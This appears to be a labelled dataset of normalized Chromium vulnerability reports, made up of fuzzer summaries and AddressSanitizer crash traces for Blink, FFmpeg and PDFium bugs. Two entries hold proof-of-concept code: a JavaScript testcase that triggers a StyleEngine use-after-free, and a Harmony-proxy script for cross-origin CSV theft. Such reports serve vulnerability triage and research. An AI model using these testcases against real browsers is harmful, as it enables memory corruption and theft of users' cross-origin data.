heap-use-after-free in blink node setneedsstylerecalc tested on os ubuntu 14.04 chromium 40.0.2209.0 developer build revision 09df15868941e7489acff767e00864769ca6338b-refs/heads/master 302420 asan-trace 21900==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 chrome 0 in getflag home/attekett/chrome/src/out/release third_party/webkit/source/core/dom/node.h:722:42 1 in indocument home/attekett/chrome/src/out/release third_party/webkit/source/core/dom/node.h:466:0 2 in inactivedocument home/attekett/chrome/src/out/release third_party/webkit/source/core/dom/node.cpp:742:0 3 in blink node setneedsstylerecalc blink stylechangetype blink stylechangereasonfortracing const home/attekett/chrome/src/out/release third_party/webkit/source/core/dom/node.cpp:710:0 4 in blink document dirtyelementsforlayerupdate home/attekett/chrome/src/out/release third_party/webkit/source/core/dom/document.cpp:2062:9 5 in blink document updatestyle blink stylerecalcchange home/attekett/chrome/src/out/release third_party/webkit/source/core/dom/document.cpp:1869:9 6 in blink document updaterendertree blink stylerecalcchange home/attekett/chrome/src/out/release third_party/webkit/source/core/dom/document.cpp:1814:5 is located 24 bytes inside of 104-byte region freed by thread t0 chrome here 0 in interceptor_free 0:0 1 in deref home/attekett/chrome/src/out/release third_party/webkit/source/core/dom/treeshared.h:82:13 2 in derefifnotnull blink containernode home/attekett/chrome/src/out/release third_party/webkit/source/wtf/passrefptr.h:57:0 3 in refptr home/attekett/chrome/src/out/release third_party/webkit/source/wtf/refptr.h:57:0 4 in blink htmlstackitem htmlstackitem home/attekett/chrome/src/out/release third_party/webkit/source/core/html/parser/htmlstackitem.h:43:0 5 in deref home/attekett/chrome/src/out/release third_party/webkit/source/wtf/refcounted.h:172:13	11
heap-use-after-free in matroska_read_seek useragent mozilla/5.0 x11 linux x86_64 applewebkit/537.36 khtml like gecko chrome/35.0.1916.153 safari/537.36 steps to reproduce the problem 1 chrome-asan uaf-w4-matroska_read_seek.html 2 wait about 4 seconds 3 asan spots the issue what is the expected behavior asan does n't spot a use after free issue what went wrong it does did this work before n/a chrome version 40.0.2200.0 channel stable os version 3.2.0 flash version shockwave flash 14.0 r0 789==error addresssanitizer heap-use-after-free on address at pc bp sp write of size 4 at thread t10 ffmpegdemuxer 0 in matroska_read_seek mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/ffmpeg/libavformat/matroskadec.c:2959 1 in seek_frame_internal mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/ffmpeg/libavformat/utils.c:2050 2 in av_seek_frame mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/ffmpeg/libavformat/utils.c:2082 3 in base internal invokehelper false int base internal runnableadapter int avformatcontext int long int void avformatcontext const int const long const int const makeitso base internal runnableadapter int avformatcontext int long int avformatcontext const int const long const int const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release base/bind_internal.h:947 4 in void base internal returnasparamadapter int base callback int const int mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release base/task_runner_util.h:23 5 in base internal invokehelper false void base internal runnableadapter void base callback int const int void base callback int const int const makeitso base internal runnableadapter void base callback int const int base callback int const int const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release base/bind_internal.h:898 6 in base anonymous namespace posttaskandreplyrelay run mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release base/threading/post_task_and_reply_impl.cc:42 7 in base internal invokehelper false void base internal runnableadapter void base anonymous namespace posttaskandreplyrelay void base anonymous namespace posttaskandreplyrelay makeitso base internal runnableadapter void base anonymous namespace posttaskandreplyrelay base anonymous namespace posttaskandreplyrelay mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release base/bind_internal.h:871 8 in base internal invoker 1 base internal bindstate base internal runnableadapter void base anonymous namespace posttaskandreplyrelay void base anonymous namespace posttaskandreplyrelay void base internal unretainedwrapper base anonymous namespace posttaskandreplyrelay void base anonymous namespace posttaskandreplyrelay run base internal bindstatebase mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release base/bind_internal.h:1166	7
assertion failed m_pendingstylesheets 0 heap-use-after-free in blink styleengine clearresolver vulnerability details the following testcase crashes the latest asan build of chrome version chrome version asan-symbolized-linux-release-301067 operating system linux 64bit reproduction case the testcase consists of three files which should be loaded from a webserver the file are also attached in crash.zip crash.html script function start o0=document.createelement iframe o0.src='iframe.xml document.getelementbyid store_div appendchild o0 window.settimeout startrly 100 function startrly o6=document.body o17=document.createelement frame o19=document.createelement marquee window.o6.appendchild o19 o6.scrollintoview false o69=document.createelementns o69.src='iframe2.html window.o6.appendchild o69 o114=document.createelement input o17.appendchild o114 document.documentelement.appendchild o0.contentdocument.firstchild window.o114.appendchild o19 window.settimeout location.reload 20 script body onload start div id store_div div script iframe.xml xml-stylesheet type text/xsl href mathml.xsl iframe2.html script function start document.body.appendchild window.top.o17 script body onload start body for crashes please include the following additional information type of crash tab crash state asan output attached in debug.txt	11
use-after-free in speech saying hello during the incognito window has closed vulnerability details please provide a brief explanation of the security issue version chrome version stable 36.0.1985.125 m operating system win7 reproduction case 1 launch chrome 2 launch incognito window ctrl+n 3 open index.html on incognito window as a fresh page as on screen-shot.png and keep clicking on the button click here then the page will close which is on incognito window 4 whoa google chrome has crashed if my explanation was unclear please watch the video on youtube to how to repro the crash for crashes please include the following additional information eax=f813e16e ebx=00000000 ecx=0bf900a0 edx=00000002 esi=0bf900a0 edi=070101e0 eip=5f73f7b1 esp=002fe878 ebp=002fe978 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 chrome_5e6a0000 getextensionvoices 5f73f7b1 ff5070 call dword ptr eax+70h ds:0023 f813e1de 0:000 k stack trace for last set context thread/.cxr resets it childebp retaddr 002fe978 5ee3eac9 chrome_5e6a0000 getextensionvoices c b\build\slave\win\build\src\chrome\browser\speech\extension_api\tts_engine_extension_api.cc 64 002fe98c 5ee3ece2 chrome_5e6a0000 ttscontroller getvoices c b\build\slave\win\build\src\chrome\browser\speech\tts_controller.cc 302 002fea60 5ee3ec90 chrome_5e6a0000 ttscontroller speaknow c b\build\slave\win\build\src\chrome\browser\speech\tts_controller.cc 157 002fea74 5ee3eb6f chrome_5e6a0000 ttscontroller speaknextutterance c b\build\slave\win\build\src\chrome\browser\speech\tts_controller.cc 330 002fea80 5f73fec7 chrome_5e6a0000 ttscontroller onttsevent c b\build\slave\win\build\src\chrome\browser\speech\tts_controller.cc 294 002feb04 5ea4151d chrome_5e6a0000 extensionttsenginesendttseventfunction runsync c b\build\slave\win\build\src\chrome\browser\speech\extension_api\tts_engine_extension_api.cc 271 002feb2c 5ea34df1 chrome_5e6a0000 syncextensionfunction run c b\build\slave\win\build\src\extensions\browser\extension_function.cc 387 002feba4 5ea34aba chrome_5e6a0000 extensions extensionfunctiondispatcher dispatchwithcallbackinternal c b\build\slave\win\build\src\extensions\browser\extension_function_dispatcher.cc 385 002febd8 5ea34a19 chrome_5e6a0000 extensions extensionfunctiondispatcher dispatch c b\build\slave\win\build\src\extensions\browser\extension_function_dispatcher.cc 309 002febe8 5ea34717 chrome_5e6a0000 extensions extensionhost onrequest c b\build\slave\win\build\src\extensions\browser\extension_host.cc 342 002fecb8 5ea11649 chrome_5e6a0000 extensionhostmsg_request dispatch extensions tabhelper extensions tabhelper void thiscall extensions tabhelper extensionhostmsg_request_params const c b\build\slave\win\build\src\extensions\common\extension_messages.h 460 002fed28 5ea095b0 chrome_5e6a0000 extensions extensionhost onmessagereceived c b\build\slave\win\build\src\extensions\browser\extension_host.cc 329 002fef08 5ea0955d chrome_5e6a0000 content webcontentsimpl onmessagereceived c b\build\slave\win\build\src\content\browser\web_contents\web_contents_impl.cc 482 002fef1c 5ea0898c chrome_5e6a0000 content webcontentsimpl onmessagereceived c b\build\slave\win\build\src\content\browser\web_contents\web_contents_impl.cc 468 002ff164 5ea088f2 chrome_5e6a0000 content renderviewhostimpl onmessagereceived c b\build\slave\win\build\src\content\browser\renderer_host\render_view_host_impl.cc 982 002ff298 5ea0860f chrome_5e6a0000 content renderprocesshostimpl onmessagereceived c b\build\slave\win\build\src\content\browser\renderer_host\render_process_host_impl.cc 1383 002ff2cc 5e753ae7 chrome_5e6a0000 ipc channelproxy context ondispatchmessage c b\build\slave\win\build\src\ipc\ipc_channel_proxy.cc 275 002ff2dc 5e709f7c chrome_5e6a0000 base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall extensions countingpolicy std basic_string char std char_traits char std allocator char const void cdecl extensions countingpolicy std basic_string char std char_traits char std allocator char const void cdecl base internal unretainedwrapper extensions countingpolicy std basic_string char std char_traits char std allocator char void cdecl extensions countingpolicy std basic_string char std char_traits char std allocator char const run c b\build\slave\win\build\src\base\bind_internal.h 1253 002ff374 5e7097fd chrome_5e6a0000 base messageloop runtask c b\build\slave\win\build\src\base\message_loop\message_loop.cc 452 002ff4b8 5e786328 chrome_5e6a0000 base messageloop dowork c b\build\slave\win\build\src\base\message_loop\message_loop.cc 577	11
heap-use-after-free in base supportsuserdata getuserdata detailed report fuzzer cdiehl_peach job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state base supportsuserdata getuserdata zoombubbleview refresh zoombubbleview showbubble unminimized testcase additional requirements requires gestures filer inferno	11
heap-use-after-free in vorbis_decode_frame detailed report fuzzer attekett_surku_fuzzer job type linux_asan_chrome_v8_arm crash type heap-use-after-free read 2 crash address crash state vorbis_decode_frame avcodec_decode_audio4 media ffmpegaudiodecoder ffmpegdecode minimized testcase 97.79 kb filer inferno	7
security cross-origin information leak via ecmascript harmony proxies vulnerability details harmony proxy can be used for cross-origin info theft in certain situations like the one shown below currently harmony proxy is disabled by default and can be enabled by chrome flags enable-javascript-harmony it means this is not a risk for now but i am reporting it to avoid a future risk version chrome version 36.0.1985.125 m production release operating system windows 7 sp1 reproduction case let s suppose victim s web page serves csv or some text-like data php header content-type text/csv charset=utf-8 header content-disposition attachment filename test.csv foo bar,123 attacker s page steals this csv by utilizing harmony proxy body script window.__proto proxy.create get function target name console.log data name script script src script body attacker s page prints data=foo and data=bar in the console note that we can thwart this type of attack by x-content-type-options nosniff header that is the very reason why the header was introduced	5
use-of-uninitialized-value in getnextnormalizedchar detailed report fuzzer miaubiz_svg_fuzzer job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state getnextnormalizedchar ucol_prv_getspecialce_52 ucol_igetnextce minimized testcase 6.02 kb filer mbarbella	7
stack-buffer-overflow in xdata32 detailed report fuzzer attekett_surku_fuzzer job type linux_asan_chrome_media crash type stack-buffer-overflow read 8 crash address crash state xdata32 xchangeproperty ui selectionowner processtarget unminimized testcase filer inferno	11
use-of-uninitialized-value in blink font glyphdataandpageforcharacter detailed report fuzzer miaubiz_css_fuzzer job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state blink font glyphdataandpageforcharacter unsigned int blink simpleshaper advanceinternal blink latin1textiterator blink simpleshaper advance minimized testcase 9.29 kb filer inferno	11
heap-buffer-overflow in color_sycc_to_rgb vulnerability details the attached testcase crashes the latest asan build of pdfium_test as follows 30705==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in sycc422_to_rgb opj_image b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:171:13 1 in color_sycc_to_rgb opj_image b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:294:9 2 in cjpx_decoder init unsigned char const int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:644:9 3 in ccodec_jpxmodule createdecoder unsigned char const unsigned int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:764:10 4 in cpdf_dibsource loadjpxbitmap b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:643:21 5 in cpdf_dibsource createdecoder b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:599:9 6 in cpdf_dibsource startloaddibsource cpdf_document cpdf_stream const int cpdf_dictionary cpdf_dictionary int unsigned int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:335:15 7 in cpdf_imagecache startgetcachedbitmap cpdf_dictionary cpdf_dictionary int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:310:15 8 in cpdf_pagerendercache startgetcachedbitmap cpdf_stream int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:131:15 9 in cpdf_progressiveimageloaderhandle start cpdf_imageloader cpdf_imageobject const cpdf_pagerendercache int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1489:15 10 in cpdf_imageloader startloadimage cpdf_imageobject const cpdf_pagerendercache void int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1549:19 11 in cpdf_imagerenderer startloaddibsource b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:371:9 12 in cpdf_imagerenderer start cpdf_renderstatus cpdf_pageobject const cfx_matrix const int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:525:9 13 in cpdf_renderstatus continuesingleobject cpdf_pageobject const cfx_matrix const ifx_pause b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:350:14 14 in cpdf_progressiverenderer continue ifx_pause b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:1175:21 15 in fpdf_renderpage_retail crendercontext void int int int int int int int ifsdk_pause_adapter b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:789:2 16 in fpdf_renderpagebitmap b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:586:2 17 in renderpdf char const char const unsigned long outputformat b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:324:5 18 in main b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:406:7 19 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 20 in start 0:0 is located 0 bytes to the right of 1195776-byte region allocated by thread t0 here 0 in interceptor_calloc 0:0 1 in opj_j2k_update_image_data b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:7748:62 2 in opj_j2k_decode_tiles b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:9184:23 3 in opj_j2k_exec b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:7048:41 4 in opj_j2k_decode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:9368:15 5 in opj_jp2_decode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/jp2.c:1332:8 6 in cjpx_decoder init unsigned char const int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:624:15 7 in ccodec_jpxmodule createdecoder unsigned char const unsigned int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:764:10 8 in cpdf_dibsource loadjpxbitmap b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:643:21 9 in cpdf_dibsource createdecoder b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:599:9 10 in cpdf_dibsource startloaddibsource cpdf_document cpdf_stream const int cpdf_dictionary cpdf_dictionary int unsigned int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:335:15 11 in cpdf_imagecache startgetcachedbitmap cpdf_dictionary cpdf_dictionary int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:310:15 12 in cpdf_pagerendercache startgetcachedbitmap cpdf_stream int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:131:15 13 in cpdf_progressiveimageloaderhandle start cpdf_imageloader cpdf_imageobject const cpdf_pagerendercache int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1489:15 14 in cpdf_imageloader startloadimage cpdf_imageobject const cpdf_pagerendercache void int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1549:19 15 in cpdf_imagerenderer startloaddibsource b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:371:9 16 in cpdf_imagerenderer start cpdf_renderstatus cpdf_pageobject const cfx_matrix const int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:525:9 17 in cpdf_renderstatus continuesingleobject cpdf_pageobject const cfx_matrix const ifx_pause b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:350:14 18 in cpdf_progressiverenderer continue ifx_pause b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:1175:21 19 in fpdf_renderpage_retail crendercontext void int int int int int int int ifsdk_pause_adapter b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:789:2 20 in fpdf_renderpagebitmap b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:586:2 21 in renderpdf char const char const unsigned long outputformat b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:324:5 22 in main b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:406:7 23 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 summary addresssanitizer heap-buffer-overflow 0 shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac asan internal fe 30705==aborting version chrome version latest asan build of pdfium_test reproduction case attached in repro.pdf	7
heap-buffer-overflow in opj_jp2_apply_cdef vulnerability details the attached testcase crashes the asan build of pdfium_test as follows 16515==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 2 at thread t0 0 in opj_jp2_apply_cdef b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/jp2.c:1122:4 1 in opj_jp2_decode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/jp2.c:1356:7 2 in cjpx_decoder init unsigned char const int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:624:15 3 in ccodec_jpxmodule createdecoder unsigned char const unsigned int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:764:10 4 in cpdf_dibsource loadjpxbitmap b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:643:21 5 in cpdf_dibsource createdecoder b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:599:9 6 in cpdf_dibsource startloaddibsource cpdf_document cpdf_stream const int cpdf_dictionary cpdf_dictionary int unsigned int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:335:15 7 in cpdf_imagecache startgetcachedbitmap cpdf_dictionary cpdf_dictionary int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:310:15 8 in cpdf_pagerendercache startgetcachedbitmap cpdf_stream int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:131:15 9 in cpdf_progressiveimageloaderhandle start cpdf_imageloader cpdf_imageobject const cpdf_pagerendercache int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1489:15 10 in cpdf_imageloader startloadimage cpdf_imageobject const cpdf_pagerendercache void int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1549:19 11 in cpdf_imagerenderer startloaddibsource b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:371:9 12 in cpdf_imagerenderer start cpdf_renderstatus cpdf_pageobject const cfx_matrix const int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:525:9 13 in cpdf_renderstatus continuesingleobject cpdf_pageobject const cfx_matrix const ifx_pause b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:350:14 14 in cpdf_progressiverenderer continue ifx_pause b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:1175:21 15 in fpdf_renderpage_retail crendercontext void int int int int int int int ifsdk_pause_adapter b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:772:2 16 in fpdf_renderpagebitmap b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:574:2 17 in renderpdf char const char const unsigned long outputformat b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:324:5 18 in main b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:406:7 19 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 20 in start 0:0 is located 0 bytes to the right of 12-byte region allocated by thread t0 here 0 in interceptor_malloc 0:0 1 in opj_jp2_read_cdef b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/jp2.c:1172:37 2 in opj_jp2_read_jp2h b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/jp2.c:2235:10 3 in opj_jp2_read_header_procedure b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/jp2.c:1906:10 4 in opj_jp2_exec b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/jp2.c:1957:26 5 in opj_jp2_read_header b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/jp2.c:2342:8 6 in cjpx_decoder init unsigned char const int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:608:10 7 in ccodec_jpxmodule createdecoder unsigned char const unsigned int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:764:10 8 in cpdf_dibsource loadjpxbitmap b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:643:21 9 in cpdf_dibsource createdecoder b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:599:9 10 in cpdf_dibsource startloaddibsource cpdf_document cpdf_stream const int cpdf_dictionary cpdf_dictionary int unsigned int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:335:15 11 in cpdf_imagecache startgetcachedbitmap cpdf_dictionary cpdf_dictionary int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:310:15 12 in cpdf_pagerendercache startgetcachedbitmap cpdf_stream int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:131:15 13 in cpdf_progressiveimageloaderhandle start cpdf_imageloader cpdf_imageobject const cpdf_pagerendercache int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1489:15 14 in cpdf_imageloader startloadimage cpdf_imageobject const cpdf_pagerendercache void int unsigned int int cpdf_renderstatus int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1549:19 15 in cpdf_imagerenderer startloaddibsource b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:371:9 16 in cpdf_imagerenderer start cpdf_renderstatus cpdf_pageobject const cfx_matrix const int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:525:9 17 in cpdf_renderstatus continuesingleobject cpdf_pageobject const cfx_matrix const ifx_pause b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:350:14 18 in cpdf_progressiverenderer continue ifx_pause b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:1175:21 19 in fpdf_renderpage_retail crendercontext void int int int int int int int ifsdk_pause_adapter b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:772:2 20 in fpdf_renderpagebitmap b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:574:2 21 in renderpdf char const char const unsigned long outputformat b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:324:5 22 in main b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:406:7 23 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 summary addresssanitizer heap-buffer-overflow 0 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fd fa fa fd fd fa fa 01 fa fa fa 01 fa fa fa 01 fa fa fa 01 fa fa fa 01 fa fa fa 01 fa fa fa 01 fa fa fa 01 fa fa fa 01 fa fa fa 00 fa fa fa 00 00 fa fa 00 04 fa fa 00 fa fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa fd fa fa fa fd fa fa 